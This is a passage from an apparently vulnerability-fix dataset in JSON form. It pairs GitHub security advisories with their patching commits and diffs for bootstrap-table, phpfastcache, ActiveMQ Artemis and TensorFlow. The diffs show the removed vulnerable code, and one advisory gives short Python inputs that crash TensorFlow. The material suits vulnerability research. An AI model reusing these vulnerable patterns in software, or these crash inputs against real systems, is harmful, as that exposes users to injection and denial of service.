            "files":"{'src\/extensions\/export\/bootstrap-table-export.js': {'additions': 4, 'deletions': 16, 'changes': 20, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/wenzhixin\/bootstrap-table\/raw\/b4a1e5dd332be652e0bc376fd9256886cf4bbde9\/src%2Fextensions%2Fexport%2Fbootstrap-table-export.js', 'patch': \"@@ -23,15 +23,7 @@ $.extend($.fn.bootstrapTable.defaults, {\\n   showExport: false,\\n   exportDataType: 'basic', \/\/ basic, all, selected\\n   exportTypes: ['json', 'xml', 'csv', 'txt', 'sql', 'excel'],\\n-  exportOptions: {\\n-    onCellHtmlData (cell, rowIndex, colIndex, htmlData) {\\n-      if (cell.is('th')) {\\n-        return cell.find('.th-inner').text()\\n-      }\\n-\\n-      return htmlData\\n-    }\\n-  },\\n+  exportOptions: {},\\n   exportFooter: false\\n })\\n \\n@@ -162,13 +154,9 @@ $.BootstrapTable = class extends $.BootstrapTable {\\n     $exportButtons.click(e => {\\n       e.preventDefault()\\n \\n-      const type = $(e.currentTarget).data('type')\\n-      const exportOptions = {\\n-        type,\\n-        escape: false\\n-      }\\n-\\n-      this.exportTable(exportOptions)\\n+      this.exportTable({\\n+        type: $(e.currentTarget).data('type')\\n+      })\\n     })\\n     this.handleToolbar()\\n   }\"}}",
            "message_norm":"fixed xss vulnerability bug by oncellhtmldata",
            "language":"en",
            "entities":"[('fixed', 'ACTION', ''), ('xss', 'SECWORD', ''), ('vulnerability', 'SECWORD', ''), ('bug', 'FLAW', '')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['src\/extensions\/export\/bootstrap-table-export.js'])",
            "num_files":1.0,
            "patch_content":"From b4a1e5dd332be652e0bc376fd9256886cf4bbde9 Mon Sep 17 00:00:00 2001\nFrom: zhixin <wenzhixin2010@gmail.com>\nDate: Tue, 10 May 2022 10:59:07 +0800\nSubject: [PATCH] Fixed XSS vulnerability bug by onCellHtmlData\n\n---\n ...\/export\/bootstrap-table-export.js          | 20 ++++---------------\n 1 file changed, 4 insertions(+), 16 deletions(-)\n\ndiff --git a\/src\/extensions\/export\/bootstrap-table-export.js b\/src\/extensions\/export\/bootstrap-table-export.js\nindex 55dcd3bc09..fe6ee5a6c9 100644\n--- a\/src\/extensions\/export\/bootstrap-table-export.js\n+++ b\/src\/extensions\/export\/bootstrap-table-export.js\n@@ -23,15 +23,7 @@ $.extend($.fn.bootstrapTable.defaults, {\n   showExport: false,\n   exportDataType: 'basic', \/\/ basic, all, selected\n   exportTypes: ['json', 'xml', 'csv', 'txt', 'sql', 'excel'],\n-  exportOptions: {\n-    onCellHtmlData (cell, rowIndex, colIndex, htmlData) {\n-      if (cell.is('th')) {\n-        return cell.find('.th-inner').text()\n-      }\n-\n-      return htmlData\n-    }\n-  },\n+  exportOptions: {},\n   exportFooter: false\n })\n \n@@ -162,13 +154,9 @@ $.BootstrapTable = class extends $.BootstrapTable {\n     $exportButtons.click(e => {\n       e.preventDefault()\n \n-      const type = $(e.currentTarget).data('type')\n-      const exportOptions = {\n-        type,\n-        escape: false\n-      }\n-\n-      this.exportTable(exportOptions)\n+      this.exportTable({\n+        type: $(e.currentTarget).data('type')\n+      })\n     })\n     this.handleToolbar()\n   }",
            "code_diff":"@@ -23,15 +23,7 @@ $.extend($.fn.bootstrapTable.defaults, {\n   showExport: false,\n   exportDataType: 'basic', \/\/ basic, all, selected\n   exportTypes: ['json', 'xml', 'csv', 'txt', 'sql', 'excel'],\n-  exportOptions: {\n-    onCellHtmlData (cell, rowIndex, colIndex, htmlData) {\n-      if (cell.is('th')) {\n-        return cell.find('.th-inner').text()\n-      }\n-\n-      return htmlData\n-    }\n-  },\n+  exportOptions: {},\n   exportFooter: false\n })\n \n@@ -162,13 +154,9 @@ $.BootstrapTable = class extends $.BootstrapTable {\n     $exportButtons.click(e => {\n       e.preventDefault()\n \n-      const type = $(e.currentTarget).data('type')\n-      const exportOptions = {\n-        type,\n-        escape: false\n-      }\n-\n-      this.exportTable(exportOptions)\n+      this.exportTable({\n+        type: $(e.currentTarget).data('type')\n+      })\n     })\n     this.handleToolbar()\n   }"
        },
        {
            "index":171,
            "vuln_id":"GHSA-484f-743f-6jx2",
            "cwe_id":"{'CWE-94'}",
            "score":4.4,
            "chain":"{'https:\/\/github.com\/PHPSocialNetwork\/phpfastcache\/commit\/c4527205cb7a402b595790c74310791f5b04a1a4'}",
            "dataset":"osv",
            "summary":"Object injection in cookie driver in phpfastcache ### Impact\nAn possible object injection has been discovered in cookie driver prior 5.0.13 versions (of 5.x releases).\n\n### Patches\nThe issue has been addressed by enforcing JSON conversion when deserializing\n\n### Workarounds\nIf you can't fix it, use another driver such as \"Files\" (Filesystem)\n\n### References\nFixing release: https:\/\/github.com\/PHPSocialNetwork\/phpfastcache\/releases\/tag\/5.0.13\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [the issue tracker](https:\/\/github.com\/PHPSocialNetwork\/phpfastcache\/issues)\n* Email us at [security@geolim4.com](mailto:security@geolim4.com)",
            "published_date":"2019-12-12",
            "chain_len":1,
            "project":"https:\/\/github.com\/PHPSocialNetwork\/phpfastcache",
            "commit_href":"https:\/\/github.com\/PHPSocialNetwork\/phpfastcache\/commit\/c4527205cb7a402b595790c74310791f5b04a1a4",
            "commit_sha":"c4527205cb7a402b595790c74310791f5b04a1a4",
            "patch":"SINGLE",
            "chain_ord":"['c4527205cb7a402b595790c74310791f5b04a1a4']",
            "before_first_fix_commit":"{'afb1d158aee1eaa07857909d43f6ce3570b82a30'}",
            "last_fix_commit":"c4527205cb7a402b595790c74310791f5b04a1a4",
            "chain_ord_pos":1.0,
            "commit_datetime":"12\/30\/2016, 08:40:00",
            "message":"Fixed critical vulnerability on cookie driver",
            "author":"Geolim4",
            "comments":null,
            "stats":"{'additions': 1, 'deletions': 1, 'total': 2}",
            "files":"{'src\/phpFastCache\/Drivers\/Cookie\/Driver.php': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/PHPSocialNetwork\/phpfastcache\/raw\/c4527205cb7a402b595790c74310791f5b04a1a4\/src%2FphpFastCache%2FDrivers%2FCookie%2FDriver.php', 'patch': '@@ -99,7 +99,7 @@ protected function driverRead(CacheItemInterface $item)\\n         \/\/ return null if no caching\\n         \/\/ return value if in caching\\n         $keyword = self::PREFIX . $item->getKey();\\n-        $x = isset($_COOKIE[ $keyword ]) ? $this->decode(json_decode($_COOKIE[ $keyword ], true)) : false;\\n+        $x = isset($_COOKIE[ $keyword ]) ? json_decode($_COOKIE[ $keyword ], true) : false;\\n \\n         if ($x == false) {\\n             return null;'}}",
            "message_norm":"fixed critical vulnerability on cookie driver",
            "language":"en",
            "entities":"[('fixed', 'ACTION', ''), ('critical', 'SEVERITY', ''), ('vulnerability', 'SECWORD', ''), ('cookie', 'SECWORD', '')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['src\/phpFastCache\/Drivers\/Cookie\/Driver.php'])",
            "num_files":1.0,
            "patch_content":"From c4527205cb7a402b595790c74310791f5b04a1a4 Mon Sep 17 00:00:00 2001\nFrom: Geolim4 <contact@geolim4.com>\nDate: Fri, 30 Dec 2016 09:40:00 +0100\nSubject: [PATCH] Fixed critical vulnerability on cookie driver\n\n---\n src\/phpFastCache\/Drivers\/Cookie\/Driver.php | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\ndiff --git a\/src\/phpFastCache\/Drivers\/Cookie\/Driver.php b\/src\/phpFastCache\/Drivers\/Cookie\/Driver.php\nindex d9045d7c0..9d006c535 100644\n--- a\/src\/phpFastCache\/Drivers\/Cookie\/Driver.php\n+++ b\/src\/phpFastCache\/Drivers\/Cookie\/Driver.php\n@@ -99,7 +99,7 @@ protected function driverRead(CacheItemInterface $item)\n         \/\/ return null if no caching\n         \/\/ return value if in caching\n         $keyword = self::PREFIX . $item->getKey();\n-        $x = isset($_COOKIE[ $keyword ]) ? $this->decode(json_decode($_COOKIE[ $keyword ], true)) : false;\n+        $x = isset($_COOKIE[ $keyword ]) ? json_decode($_COOKIE[ $keyword ], true) : false;\n \n         if ($x == false) {\n             return null;",
            "code_diff":"@@ -99,7 +99,7 @@ protected function driverRead(CacheItemInterface $item)\n         \/\/ return null if no caching\n         \/\/ return value if in caching\n         $keyword = self::PREFIX . $item->getKey();\n-        $x = isset($_COOKIE[ $keyword ]) ? $this->decode(json_decode($_COOKIE[ $keyword ], true)) : false;\n+        $x = isset($_COOKIE[ $keyword ]) ? json_decode($_COOKIE[ $keyword ], true) : false;\n \n         if ($x == false) {\n             return null;"
        },
        {
            "index":48,
            "vuln_id":"GHSA-pr38-qpxm-g88x",
            "cwe_id":"{'CWE-400'}",
            "score":7.5,
            "chain":"{'https:\/\/github.com\/apache\/activemq-artemis\/pull\/3871\/commits\/153d2e9a979aead8dff95fbc91d659ecc7d0fb82', 'https:\/\/github.com\/apache\/activemq-artemis\/pull\/3862\/commits\/1f92368240229b8f5db92a92a72c703faf83e9b7'}",
            "dataset":"osv",
            "summary":"Uncontrolled Resource Consumption in Apache ActiveMQ Artemis In Apache ActiveMQ Artemis prior to 2.20.0 or 2.19.1, an attacker could partially disrupt availability (DoS) through uncontrolled resource consumption of memory.",
            "published_date":"2022-02-06",
            "chain_len":2,
            "project":"https:\/\/github.com\/apache\/activemq-artemis",
            "commit_href":"https:\/\/github.com\/apache\/activemq-artemis\/pull\/3862\/commits\/1f92368240229b8f5db92a92a72c703faf83e9b7",
            "commit_sha":"1f92368240229b8f5db92a92a72c703faf83e9b7",
            "patch":"MULTI",
            "chain_ord":"['1f92368240229b8f5db92a92a72c703faf83e9b7', '153d2e9a979aead8dff95fbc91d659ecc7d0fb82']",
            "before_first_fix_commit":"{'4196faf7ce56cb3676d46acb3b0684b5cdf804d7'}",
            "last_fix_commit":"153d2e9a979aead8dff95fbc91d659ecc7d0fb82",
            "chain_ord_pos":1.0,
            "commit_datetime":"11\/19\/2021, 12:02:45",
            "message":"Be defensive when reading data from `ActiveMQBuffer` and allocating memory.\n\nOr else, an adversary may handcraft the packet causing OOM situation for a running a JVM.",
            "author":"Viktor Kolomeyko",
            "comments":null,
            "stats":"{'additions': 16, 'deletions': 4, 'total': 20}",
            "files":"{'artemis-core-client\/src\/main\/java\/org\/apache\/activemq\/artemis\/utils\/XidCodecSupport.java': {'additions': 16, 'deletions': 4, 'changes': 20, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/apache\/activemq-artemis\/raw\/1f92368240229b8f5db92a92a72c703faf83e9b7\/artemis-core-client%2Fsrc%2Fmain%2Fjava%2Forg%2Fapache%2Factivemq%2Fartemis%2Futils%2FXidCodecSupport.java', 'patch': '@@ -32,12 +32,24 @@ public static void encodeXid(final Xid xid, final ActiveMQBuffer out) {\\n       out.writeBytes(xid.getGlobalTransactionId());\\n    }\\n \\n+   private static byte[] safeReadBytes(final ActiveMQBuffer in) {\\n+      int claimedSize = in.readInt();\\n+      int bufferCapacity = in.capacity();\\n+      \/\/ We have to be defensive here and not try to allocate byte buffer straight from information available in the\\n+      \/\/ stream. Or else, an adversary may handcraft the packet causing OOM situation for a running JVM.\\n+      if (claimedSize > bufferCapacity) {\\n+         throw new IllegalStateException(\"Buffer size: \" + claimedSize +\\n+                 \" exceeds overall buffer size of: \" + bufferCapacity);\\n+      }\\n+      byte[] byteBuffer = new byte[claimedSize];\\n+      in.readBytes(byteBuffer);\\n+      return byteBuffer;\\n+   }\\n+\\n    public static Xid decodeXid(final ActiveMQBuffer in) {\\n       int formatID = in.readInt();\\n-      byte[] bq = new byte[in.readInt()];\\n-      in.readBytes(bq);\\n-      byte[] gtxid = new byte[in.readInt()];\\n-      in.readBytes(gtxid);\\n+      byte[] bq = safeReadBytes(in);\\n+      byte[] gtxid = safeReadBytes(in);\\n       return new XidImpl(bq, formatID, gtxid);\\n    }'}}",
            "message_norm":"be defensive when reading data from `activemqbuffer` and allocating memory.\n\nor else, an adversary may handcraft the packet causing oom situation for a running a jvm.",
            "language":"en",
            "entities":null,
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['artemis-core-client\/src\/main\/java\/org\/apache\/activemq\/artemis\/utils\/XidCodecSupport.java'])",
            "num_files":1.0,
            "patch_content":"From 1f92368240229b8f5db92a92a72c703faf83e9b7 Mon Sep 17 00:00:00 2001\nFrom: Viktor Kolomeyko <Viktor.Kolomeyko@r3.com>\nDate: Fri, 19 Nov 2021 12:02:45 +0000\nSubject: [PATCH] Be defensive when reading data from `ActiveMQBuffer` and\n allocating memory.\n\nOr else, an adversary may handcraft the packet causing OOM situation for a running a JVM.\n---\n ...\/artemis\/utils\/XidCodecSupport.java        | 20 +++++++++++++++----\n 1 file changed, 16 insertions(+), 4 deletions(-)\n\ndiff --git a\/artemis-core-client\/src\/main\/java\/org\/apache\/activemq\/artemis\/utils\/XidCodecSupport.java b\/artemis-core-client\/src\/main\/java\/org\/apache\/activemq\/artemis\/utils\/XidCodecSupport.java\nindex f746483fa0a..ed0cfe348e7 100644\n--- a\/artemis-core-client\/src\/main\/java\/org\/apache\/activemq\/artemis\/utils\/XidCodecSupport.java\n+++ b\/artemis-core-client\/src\/main\/java\/org\/apache\/activemq\/artemis\/utils\/XidCodecSupport.java\n@@ -32,12 +32,24 @@ public static void encodeXid(final Xid xid, final ActiveMQBuffer out) {\n       out.writeBytes(xid.getGlobalTransactionId());\n    }\n \n+   private static byte[] safeReadBytes(final ActiveMQBuffer in) {\n+      int claimedSize = in.readInt();\n+      int bufferCapacity = in.capacity();\n+      \/\/ We have to be defensive here and not try to allocate byte buffer straight from information available in the\n+      \/\/ stream. Or else, an adversary may handcraft the packet causing OOM situation for a running JVM.\n+      if (claimedSize > bufferCapacity) {\n+         throw new IllegalStateException(\"Buffer size: \" + claimedSize +\n+                 \" exceeds overall buffer size of: \" + bufferCapacity);\n+      }\n+      byte[] byteBuffer = new byte[claimedSize];\n+      in.readBytes(byteBuffer);\n+      return byteBuffer;\n+   }\n+\n    public static Xid decodeXid(final ActiveMQBuffer in) {\n       int formatID = in.readInt();\n-      byte[] bq = new byte[in.readInt()];\n-      in.readBytes(bq);\n-      byte[] gtxid = new byte[in.readInt()];\n-      in.readBytes(gtxid);\n+      byte[] bq = safeReadBytes(in);\n+      byte[] gtxid = safeReadBytes(in);\n       return new XidImpl(bq, formatID, gtxid);\n    }",
            "code_diff":"@@ -32,12 +32,24 @@ public static void encodeXid(final Xid xid, final ActiveMQBuffer out) {\n       out.writeBytes(xid.getGlobalTransactionId());\n    }\n \n+   private static byte[] safeReadBytes(final ActiveMQBuffer in) {\n+      int claimedSize = in.readInt();\n+      int bufferCapacity = in.capacity();\n+      \/\/ We have to be defensive here and not try to allocate byte buffer straight from information available in the\n+      \/\/ stream. Or else, an adversary may handcraft the packet causing OOM situation for a running JVM.\n+      if (claimedSize > bufferCapacity) {\n+         throw new IllegalStateException(\"Buffer size: \" + claimedSize +\n+                 \" exceeds overall buffer size of: \" + bufferCapacity);\n+      }\n+      byte[] byteBuffer = new byte[claimedSize];\n+      in.readBytes(byteBuffer);\n+      return byteBuffer;\n+   }\n+\n    public static Xid decodeXid(final ActiveMQBuffer in) {\n       int formatID = in.readInt();\n-      byte[] bq = new byte[in.readInt()];\n-      in.readBytes(bq);\n-      byte[] gtxid = new byte[in.readInt()];\n-      in.readBytes(gtxid);\n+      byte[] bq = safeReadBytes(in);\n+      byte[] gtxid = safeReadBytes(in);\n       return new XidImpl(bq, formatID, gtxid);\n    }"
        },
        {
            "index":785,
            "vuln_id":"GHSA-vq36-27g6-p492",
            "cwe_id":"{'CWE-125'}",
            "score":8.1,
            "chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/c99d98cd189839dcf51aee94e7437b54b31f8abd'}",
            "dataset":"osv",
            "summary":"Out of bounds read in Tensorflow ### Impact\nTensorFlow's [type inference](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/274df9b02330b790aa8de1cee164b70f72b9b244\/tensorflow\/core\/graph\/graph.cc#L223-L229) can cause a heap OOB read as the bounds checking is done in a `DCHECK` (which is a no-op during production):\n\n```cc\nif (node_t.type_id() != TFT_UNSET) {\n  int ix = input_idx[i];\n  DCHECK(ix < node_t.args_size())\n      << \"input \" << i << \" should have an output \" << ix\n      << \" but instead only has \" << node_t.args_size()\n      << \" outputs: \" << node_t.DebugString();\n  input_types.emplace_back(node_t.args(ix));\n  \/\/ ...\n}       \n```   \n      \nAn attacker can control `input_idx` such that `ix` would be larger than the number of values in `node_t.args`.\n        \n### Patches\nWe have patched the issue in GitHub commit [c99d98cd189839dcf51aee94e7437b54b31f8abd](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/c99d98cd189839dcf51aee94e7437b54b31f8abd).\n  \nThe fix will be included in TensorFlow 2.8.0. This is the only affected version.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",
            "published_date":"2022-02-09",
            "chain_len":1,
            "project":"https:\/\/github.com\/tensorflow\/tensorflow",
            "commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/c99d98cd189839dcf51aee94e7437b54b31f8abd",
            "commit_sha":"c99d98cd189839dcf51aee94e7437b54b31f8abd",
            "patch":"SINGLE",
            "chain_ord":"['c99d98cd189839dcf51aee94e7437b54b31f8abd']",
            "before_first_fix_commit":"{'c5ae019abd2f260cf3400abcce4962c75cc5182c'}",
            "last_fix_commit":"c99d98cd189839dcf51aee94e7437b54b31f8abd",
            "chain_ord_pos":1.0,
            "commit_datetime":"11\/13\/2021, 01:42:30",
            "message":"Handle invalid inputs instead of crashing.\n\nPiperOrigin-RevId: 409549744\nChange-Id: I7f5935b34b53f7e426a5462fcc027bdbf5dcda24",
            "author":"Dan Moldovan",
            "comments":null,
            "stats":"{'additions': 10, 'deletions': 4, 'total': 14}",
            "files":"{'tensorflow\/core\/graph\/graph.cc': {'additions': 10, 'deletions': 4, 'changes': 14, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/c99d98cd189839dcf51aee94e7437b54b31f8abd\/tensorflow%2Fcore%2Fgraph%2Fgraph.cc', 'patch': '@@ -222,10 +222,16 @@ void Node::RunForwardTypeInference() {\\n       const auto& node_t = node->def().experimental_type();\\n       if (node_t.type_id() != TFT_UNSET) {\\n         int ix = input_idx[i];\\n-        DCHECK(ix < node_t.args_size())\\n-            << \"input \" << i << \" should have an output \" << ix\\n-            << \" but instead only has \" << node_t.args_size()\\n-            << \" outputs: \" << node_t.DebugString();\\n+        if (ix >= node_t.args_size()) {\\n+          LOG(WARNING) << name() << \" has bad type information: input \" << i\\n+                       << \" should have an output \" << ix\\n+                       << \" but instead only has \" << node_t.args_size()\\n+                       << \" outputs: \" << node_t.DebugString()\\n+                       << \"\\\\nThis indicates either \"\\n+                          \"a bug in op registration or a corrupted graph.\";\\n+          ClearTypeInfo();\\n+          return;\\n+        }\\n         input_types.emplace_back(node_t.args(ix));\\n       } else {\\n         input_types.emplace_back(*no_type);'}}",
            "message_norm":"handle invalid inputs instead of crashing.\n\npiperorigin-revid: 409549744\nchange-id: i7f5935b34b53f7e426a5462fcc027bdbf5dcda24",
            "language":"en",
            "entities":"[('409549744', 'SHA', 'generic_sha')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['tensorflow\/core\/graph\/graph.cc'])",
            "num_files":1.0,
            "patch_content":"From c99d98cd189839dcf51aee94e7437b54b31f8abd Mon Sep 17 00:00:00 2001\nFrom: Dan Moldovan <mdan@google.com>\nDate: Fri, 12 Nov 2021 17:42:30 -0800\nSubject: [PATCH] Handle invalid inputs instead of crashing.\n\nPiperOrigin-RevId: 409549744\nChange-Id: I7f5935b34b53f7e426a5462fcc027bdbf5dcda24\n---\n tensorflow\/core\/graph\/graph.cc | 14 ++++++++++----\n 1 file changed, 10 insertions(+), 4 deletions(-)\n\ndiff --git a\/tensorflow\/core\/graph\/graph.cc b\/tensorflow\/core\/graph\/graph.cc\nindex 2e3703b66030f4..4af258a203813d 100644\n--- a\/tensorflow\/core\/graph\/graph.cc\n+++ b\/tensorflow\/core\/graph\/graph.cc\n@@ -222,10 +222,16 @@ void Node::RunForwardTypeInference() {\n       const auto& node_t = node->def().experimental_type();\n       if (node_t.type_id() != TFT_UNSET) {\n         int ix = input_idx[i];\n-        DCHECK(ix < node_t.args_size())\n-            << \"input \" << i << \" should have an output \" << ix\n-            << \" but instead only has \" << node_t.args_size()\n-            << \" outputs: \" << node_t.DebugString();\n+        if (ix >= node_t.args_size()) {\n+          LOG(WARNING) << name() << \" has bad type information: input \" << i\n+                       << \" should have an output \" << ix\n+                       << \" but instead only has \" << node_t.args_size()\n+                       << \" outputs: \" << node_t.DebugString()\n+                       << \"\\nThis indicates either \"\n+                          \"a bug in op registration or a corrupted graph.\";\n+          ClearTypeInfo();\n+          return;\n+        }\n         input_types.emplace_back(node_t.args(ix));\n       } else {\n         input_types.emplace_back(*no_type);",
            "code_diff":"@@ -222,10 +222,16 @@ void Node::RunForwardTypeInference() {\n       const auto& node_t = node->def().experimental_type();\n       if (node_t.type_id() != TFT_UNSET) {\n         int ix = input_idx[i];\n-        DCHECK(ix < node_t.args_size())\n-            << \"input \" << i << \" should have an output \" << ix\n-            << \" but instead only has \" << node_t.args_size()\n-            << \" outputs: \" << node_t.DebugString();\n+        if (ix >= node_t.args_size()) {\n+          LOG(WARNING) << name() << \" has bad type information: input \" << i\n+                       << \" should have an output \" << ix\n+                       << \" but instead only has \" << node_t.args_size()\n+                       << \" outputs: \" << node_t.DebugString()\n+                       << \"\\nThis indicates either \"\n+                          \"a bug in op registration or a corrupted graph.\";\n+          ClearTypeInfo();\n+          return;\n+        }\n         input_types.emplace_back(node_t.args(ix));\n       } else {\n         input_types.emplace_back(*no_type);"
        },
        {
            "index":596,
            "vuln_id":"GHSA-452g-f7fp-9jf7",
            "cwe_id":"{'CWE-476'}",
            "score":2.5,
            "chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/030af767d357d1b4088c4a25c72cb3906abac489'}",
            "dataset":"osv",
            "summary":"Type confusion during tensor casts lead to dereferencing null pointers ### Impact\nCalling TF operations with tensors of non-numeric types when the operations expect numeric tensors result in null pointer dereferences.\n\nThere are multiple ways to reproduce this, listing a few examples here:\n\n```python\nimport tensorflow as tf\nimport numpy as np\ndata = tf.random.truncated_normal(shape=1,mean=np.float32(20.8739),stddev=779.973,dtype=20,seed=64)\n```\n\n```python\nimport tensorflow as tf\nimport numpy as np\ndata =\ntf.random.stateless_truncated_normal(shape=1,seed=[63,70],mean=np.float32(20.8739),stddev=779.973,dtype=20)\n```\n\n```python\nimport tensorflow as tf\nimport numpy as np\ndata = tf.one_hot(indices=[62,50],depth=136,on_value=np.int32(237),off_value=158,axis=856,dtype=20)\n```\n\n```python\nimport tensorflow as tf\nimport numpy as np\ndata = tf.range(start=np.int32(214),limit=660,delta=129,dtype=20)\n```\n\n```python\nimport tensorflow as tf\nimport numpy as np\ndata = tf.raw_ops.ResourceCountUpTo(resource=np.int32(30), limit=872, T=3)\n```\n\n```python\nimport tensorflow as tf\nimport numpy as np\n\nwriter_array = np.array([1,2],dtype=np.int32)\nwriter_tensor = tf.convert_to_tensor(writer_array,dtype=tf.resource)\n```\n\nAll these examples and similar ones have the same behavior: the [conversion from Python array to C++ array](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/ff70c47a396ef1e3cb73c90513da4f5cb71bebba\/tensorflow\/python\/lib\/core\/ndarray_tensor.cc#L113-L169) is vulnerable to a type confusion:\n\n```cc\n  int pyarray_type = PyArray_TYPE(array);\n  PyArray_Descr* descr = PyArray_DESCR(array);\n  switch (pyarray_type) {\n    ...\n    case NPY_VOID:\n      \/\/ Quantized types are currently represented as custom struct types.\n      \/\/ PyArray_TYPE returns NPY_VOID for structs, and we should look into\n      \/\/ descr to derive the actual type.\n      \/\/ Direct feeds of certain types of ResourceHandles are represented as a\n      \/\/ custom struct type.\n      return PyArrayDescr_to_TF_DataType(descr, out_tf_datatype);\n    ...\n  }\n```\n\nFor the tensor types involved in the above example, the `pyarray_type` is `NPY_VOID` but the `descr` field is such that `descr->field = NULL`. Then [`PyArrayDescr_to_TF_DataType`](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/ff70c47a396ef1e3cb73c90513da4f5cb71bebba\/tensorflow\/python\/lib\/core\/ndarray_tensor.cc#L72-L77) will trigger a null dereference:\n\n```cc\nStatus PyArrayDescr_to_TF_DataType(PyArray_Descr* descr,\n                                   TF_DataType* out_tf_datatype) {\n  PyObject* key;\n  PyObject* value;\n  Py_ssize_t pos = 0;\n  if (PyDict_Next(descr->fields, &pos, &key, &value)) {\n    ...\n  }\n}\n```\n\nThis is because the Python's `PyDict_Next` implementation would dereference the first argument.\n\n### Patches\nWe have patched the issue in GitHub commit [030af767d357d1b4088c4a25c72cb3906abac489](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/030af767d357d1b4088c4a25c72cb3906abac489).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360 as well as Ye Zhang and Yakun Zhang of Baidu X-Team.",
            "published_date":"2021-05-21",
            "chain_len":1,
            "project":"https:\/\/github.com\/tensorflow\/tensorflow",
            "commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/030af767d357d1b4088c4a25c72cb3906abac489",
            "commit_sha":"030af767d357d1b4088c4a25c72cb3906abac489",
            "patch":"SINGLE",
            "chain_ord":"['030af767d357d1b4088c4a25c72cb3906abac489']",
            "before_first_fix_commit":"{'ff70c47a396ef1e3cb73c90513da4f5cb71bebba'}",
            "last_fix_commit":"030af767d357d1b4088c4a25c72cb3906abac489",
            "chain_ord_pos":1.0,
            "commit_datetime":"04\/13\/2021, 21:25:01",
            "message":"Fix `tf.raw_ops.ResourceCountUpTo` null pointer dereference.\n\nPiperOrigin-RevId: 368294347\nChange-Id: I2c16fbfc9b4966c402c3d8e311f0d665a9c852d8",
            "author":"Amit Patankar",
            "comments":null,
            "stats":"{'additions': 8, 'deletions': 0, 'total': 8}",
            "files":"{'tensorflow\/python\/lib\/core\/ndarray_tensor.cc': {'additions': 8, 'deletions': 0, 'changes': 8, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/030af767d357d1b4088c4a25c72cb3906abac489\/tensorflow%2Fpython%2Flib%2Fcore%2Fndarray_tensor.cc', 'patch': '@@ -16,6 +16,7 @@ limitations under the License.\\n #include \"tensorflow\/python\/lib\/core\/ndarray_tensor.h\"\\n \\n #include <cstring>\\n+#include <optional>\\n \\n #include \"tensorflow\/c\/eager\/tfe_context_internal.h\"\\n #include \"tensorflow\/c\/tf_tensor_internal.h\"\\n@@ -74,6 +75,13 @@ Status PyArrayDescr_to_TF_DataType(PyArray_Descr* descr,\\n   PyObject* key;\\n   PyObject* value;\\n   Py_ssize_t pos = 0;\\n+\\n+  \/\/ Return an error if the fields attribute is null.\\n+  \/\/ Occurs with an improper conversion attempt to resource.\\n+  if (descr->fields == nullptr) {\\n+    return errors::Internal(\"Unexpected numpy data type\");\\n+  }\\n+\\n   if (PyDict_Next(descr->fields, &pos, &key, &value)) {\\n     \/\/ In Python 3, the keys of numpy custom struct types are unicode, unlike\\n     \/\/ Python 2, where the keys are bytes.'}}",
            "message_norm":"fix `tf.raw_ops.resourcecountupto` null pointer dereference.\n\npiperorigin-revid: 368294347\nchange-id: i2c16fbfc9b4966c402c3d8e311f0d665a9c852d8",
            "language":"en",
            "entities":"[('fix', 'ACTION', ''), ('null pointer dereference', 'SECWORD', ''), ('368294347', 'SHA', 'generic_sha')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['tensorflow\/python\/lib\/core\/ndarray_tensor.cc'])",
            "num_files":1.0,
            "patch_content":"From 030af767d357d1b4088c4a25c72cb3906abac489 Mon Sep 17 00:00:00 2001\nFrom: Amit Patankar <amitpatankar@google.com>\nDate: Tue, 13 Apr 2021 14:25:01 -0700\nSubject: [PATCH] Fix `tf.raw_ops.ResourceCountUpTo` null pointer dereference.\n\nPiperOrigin-RevId: 368294347\nChange-Id: I2c16fbfc9b4966c402c3d8e311f0d665a9c852d8\n---\n tensorflow\/python\/lib\/core\/ndarray_tensor.cc | 8 ++++++++\n 1 file changed, 8 insertions(+)\n\ndiff --git a\/tensorflow\/python\/lib\/core\/ndarray_tensor.cc b\/tensorflow\/python\/lib\/core\/ndarray_tensor.cc\nindex 03fbea397485e8..6cf51ceebbdaaa 100644\n--- a\/tensorflow\/python\/lib\/core\/ndarray_tensor.cc\n+++ b\/tensorflow\/python\/lib\/core\/ndarray_tensor.cc\n@@ -16,6 +16,7 @@ limitations under the License.\n #include \"tensorflow\/python\/lib\/core\/ndarray_tensor.h\"\n \n #include <cstring>\n+#include <optional>\n \n #include \"tensorflow\/c\/eager\/tfe_context_internal.h\"\n #include \"tensorflow\/c\/tf_tensor_internal.h\"\n@@ -74,6 +75,13 @@ Status PyArrayDescr_to_TF_DataType(PyArray_Descr* descr,\n   PyObject* key;\n   PyObject* value;\n   Py_ssize_t pos = 0;\n+\n+  \/\/ Return an error if the fields attribute is null.\n+  \/\/ Occurs with an improper 